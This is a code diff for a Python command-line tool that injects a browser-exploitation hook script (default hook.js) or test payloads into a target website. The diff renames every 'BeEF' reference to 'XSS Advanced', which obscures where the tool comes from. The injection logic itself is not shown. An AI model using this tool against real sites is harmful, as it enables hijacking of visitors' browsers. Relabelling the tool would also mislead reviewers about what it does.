@@ -4,13 +4,13 @@ import argparse
 import requests
 import re
 from urllib.parse import urljoin, urlparse
-from beef_injection import BeEFInjector
+from xss_advanced_injection import XSSAdvancedInjector
 
 def main():
-    parser = argparse.ArgumentParser(description="BeEF Hook Injection Tool")
+    parser = argparse.ArgumentParser(description="XSS Advanced Hook Injection Tool")
     parser.add_argument("target", help="Target domain or URL")
     parser.add_argument("--hook-url", default="http://localhost:3000/hook.js", 
-                       help="BeEF hook URL (default: http://localhost:3000/hook.js)")
+                       help="XSS advanced hook URL (default: http://localhost:3000/hook.js)")
     parser.add_argument("--payload-type", choices=["hook", "alert", "console", "iframe"], 
                        default="hook", help="Type of payload to inject")
     parser.add_argument("--scan-only", action="store_true", 
@@ -20,13 +20,13 @@ def main():
     
     args = parser.parse_args()
     
-    print("BeEF Hook Injection Tool")
+    print("XSS Advanced Hook Injection Tool")
     print("=" * 40)
     
-    injector = BeEFInjector(args.hook_url)
+    injector = XSSAdvancedInjector(args.hook_url)
     
     print(f"Target: {args.target}")
-    print(f"BeEF Hook: {args.hook_url}")
+    print(f"XSS Advanced Hook: {args.hook_url}")
     print(f"Payload Type: {args.payload_type}")
     print()
     
@@ -56,8 +56,8 @@ def main():
             print(f"Error: {result['error']}")
     
     else:
-        print("Injecting BeEF hook...")
-        results = inject_beef_hook(args.target)
+        print("Injecting XSS advanced hook...")
+        results = inject_xss_advanced_hook(args.target)
         
         print(f"\nInjection Results:")
         print(f"  Target: {results['target']}")
